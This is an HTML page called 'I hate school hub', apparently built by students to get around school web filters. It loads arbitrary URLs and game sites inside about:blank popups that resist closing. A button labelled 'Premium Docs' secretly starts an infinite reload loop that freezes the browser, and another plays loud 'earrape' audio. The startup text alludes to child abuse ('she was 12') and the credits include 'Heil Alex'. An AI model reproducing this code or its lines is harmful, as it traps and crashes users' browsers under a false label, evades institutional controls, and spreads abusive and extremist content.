
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>I hate school hub</title>

<style>
body {
  margin: 0;
  min-height: 100vh;
  background: black;
  color: #00ff9c;
  font-family: "Courier New", monospace;
  display: flex;
  justify-content: center;
  align-items: center;
  overflow: hidden;
}

canvas { position: fixed; inset: 0; z-index: -1; }

.terminal {
  background: rgba(0,0,0,.85);
  border: 1px solid #00ff9c;
  padding: 20px;
  width: 800px;
  box-shadow: 0 0 25px rgba(0,255,156,.4);
  position: relative;
  overflow-y: auto;
  max-height: 80vh;
}

h1 { margin: 0 0 10px; }

#terminalText {
  white-space: pre-wrap;
  line-height: 1.4;
  min-height: 120px;
}

.cursor {
  display:inline-block;
  width:10px;
  height:18px;
  background:#00ff9c;
  animation: blink 1s infinite;
}

@keyframes blink { 50% { opacity:0; } }

button {
  width:100%;
  margin-top:10px;
  background:black;
  color:#00ff9c;
  border:1px solid #00ff9c;
  padding:10px;
  font-family:inherit;
  cursor:pointer;
  text-align:left;
}

button:hover { background:#00ff9c; color:black; }

.credits-btn {
  position:absolute;
  bottom:10px;
  right:10px;
  width:auto;
  font-size:12px;
}

.extra-btn {
  position:absolute;
  bottom:10px;
  right:90px;
  width:auto;
  font-size:12px;
}

.credits-box {
  display:none;
  margin-top:10px;
  border-top:1px solid #00ff9c;
  padding-top:8px;
}
</style>
</head>

<body>
<canvas id="matrix"></canvas>

<div class="terminal">
<h1>I hate school hub</h1>
<div id="terminalText"></div><span class="cursor"></span>

<button onclick="openBlank()">> launch_about_blank</button>
<button onclick="launchBritishMan()">> launch_british_man</button>
<button onclick="runEliteGamez()">> elite_gamez</button>

<button class="extra-btn" onclick="openExtra()">extra</button>
<button class="credits-btn" onclick="openCredits()">credits</button>
<div id="creditsBox" class="credits-box"></div>
</div>

<script>
// ===== TERMINAL STARTUP =====
const bootLines = [
  "Initializing system...",
  "Running diagnostics...",
  "byp@ss protocol engaged...",
  "she was 12, oliver...",
  "unbl0k3d mode enabled...",
  "System online."
];

let bi = 0;
(function boot() {
  if (bi >= bootLines.length) return;
  let line = bootLines[bi], i = 0;
  (function type() {
    if (i < line.length) {
      terminalText.textContent += line[i++];
      setTimeout(type, 40);
    } else {
      terminalText.textContent += "\n";
      bi++;
      setTimeout(boot, 400);
    }
  })();
})();

function log(msg) {
  terminalText.textContent += msg + "\n";

  // Auto-clear if terminal content is too long
  const maxLines = 50;
  let lines = terminalText.textContent.split("\n");
  if (lines.length > maxLines) {
    terminalText.textContent = lines.slice(-maxLines).join("\n");
  }
}

// ===== ABOUT:BLANK + ANTI-CLOSE =====
function createPopup(url) {
  const win = window.open("about:blank", "_blank", "width=900,height=600");
  if (!win) { alert("Popup blocked"); return; }

  fetch(url)
    .then(r => r.text())
    .then(html => {
      win.document.open();
      win.document.write(html);
      win.document.close();
      win.onbeforeunload = e => { e.preventDefault(); return ""; };
    });
}

// ===== BUTTONS =====
function openBlank() {
  const u = prompt("Paste URL:");
  if (u) { log("Launching about:blank..."); createPopup(u); }
}

function launchBritishMan() {
  log("Launching british man...");
  const w = window.open("https://html.cafe/xa4dd0de0", "_blank", "width=900,height=600");
  if (!w) { alert("Popup blocked"); return; }
  w.onbeforeunload = e => { e.preventDefault(); return ""; };
}

function runEliteGamez() {
  log("Executing elite_gamez...");
  createPopup("https://cdn.jsdelivr.net/gh/elite-gamez/elite-gamez.github.io@main/g67.html?=" + Date.now());
}

// ===== CREDITS =====
function openCredits() {
  const box = document.getElementById("creditsBox");
  box.style.display = "block";
  box.textContent = "Made by Bentley, Heil Alex, hassan keys";
}

// ===== EXTRA =====
function openExtra() {
  log("\nExtra Menu:");
  addExtra("1. Premium Docs", openPremiumDocs);
  addExtra("2. Hidden earrape", openHiddenFiles);
  addExtra("3. Empty", () => log("Nothing here yet"));
}

function addExtra(text, fn) {
  const b = document.createElement("button");
  b.textContent = text;
  b.onclick = fn;
  document.querySelector(".terminal").appendChild(b);
}

// ===== PREMIUM DOCS (Revised) =====
function openPremiumDocs() {
  log("Opening premium documents...\n");

  // 1. Run the glitchy blur/static overlay (Keeping this from your original code)
  function a(e) {
    var n = e.childNodes;
    for (var i in n) {
      a(n[i]);
      if (n[i].style) {
        n[i].style.backgroundImage =
          "url(https://cdn.discordapp.com/attachments/999685490036965447/1182346564786720798/HULK-SMASH.gif?ex=693f83cb&is=693e324b&hm=d74e3fee81db76205d71c816d02ede5707f0e945bf9c21d03fd4ec5fc5df3274)";
      }
    }
  }
  a(document);

  var howfast = 0;
  var bluroffspeed = howfast;
  var bluronspeed = howfast * 0;

  function bluron() {
    document.body.style.filter = "blur(0px)";
    setTimeout(() => {
      document.body.style.filter = "blur(0px)";
    }, bluroffspeed);
  }
  setInterval(bluron, bluronspeed);

  // 2. Fullscreen GIF Overlay (Fixed to cover everything)
  function waiting() {
    var elem = document.createElement("div");
    // Corrected to get the single <body> element
    var body = document.getElementsByTagName("body")[0]; 
    if (body) { // Ensure body exists before appending
        body.appendChild(elem);
    } else {
        // Fallback if body is not ready, though unlikely
        return; 
    }
    
    elem.style.position = "fixed";
    elem.style.top = "0";
    elem.style.left = "0";
    elem.style.width = "100%"; // Corrected for fullscreen
    elem.style.height = "100%"; // Corrected for fullscreen
    elem.style.zIndex = 99999999; // Extremely high z-index to cover all elements
    elem.style.opacity = 1;
    elem.style.backgroundImage =
      "url(https://cdn.discordapp.com/attachments/1332433346210299904/1374675243163189290/image0.gif?ex=693f2756&is=693dd5d6&hm=0b0e60f4512632a774f5c4d9cd2169f20b89ad64e6e843380afd6879509583e9)";
    elem.style.backgroundSize = "cover";
    elem.style.textAlign = "center";
    // Removed overly large font size which caused issues
    // elem.style.fontSize = "100000%";
    elem.style.color = "blue";
    elem.id = "elem";
  }
  
  // 3. Execution Timers (As requested)
  // This will display the fullscreen GIF
  setTimeout(waiting, 900);

  // This will initiate the highly disruptive infinite reload loop
  setTimeout(() => {
    log("SYSTEM LOCKUP INITIATED: UNSTABLE RELOAD LOOP.");
    while (true) {
      window.location.reload(1);
    }
  }, 1800);
}
// ===== HIDDEN EARRAPE =====
function openHiddenFiles() {
  log("Launching hidden audio...\n");
  alert('High pitched noise! Press H to hide.');
  const s='https://www.youtube.com/embed/MMNa8yqUEbE';
  const b=document.createElement('iframe');
  b.src=s;
  b.id='rusic-modal';
  b.style='position:fixed;z-index:999999;width:400px;height:270px;left:10px;top:10px;border:5px solid #009933;overflow:hidden;background:#fff;';
  document.body.appendChild(b);
  window.addEventListener('keydown', function(e){ if(e.key=='h') b.style.left='-1000000000000px'; });
}

// ===== MATRIX =====
const c = matrix, ctx = c.getContext("2d");
c.width = innerWidth; c.height = innerHeight;
const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const drops = Array(Math.floor(c.width / 16)).fill(1);

setInterval(() => {
  ctx.fillStyle = "rgba(0,0,0,.05)";
  ctx.fillRect(0, 0, c.width, c.height);
  ctx.fillStyle = "#00ff9c";
  ctx.font = "16px monospace";
  drops.forEach((y,i)=>{
    ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*16, y*16);
    if(y*16>c.height && Math.random()>.975) drops[i]=0;
    drops[i]++;
  });
},35);

window.onresize = () => { c.width = innerWidth; c.height = innerHeight; }
</script>
</body>
</html>
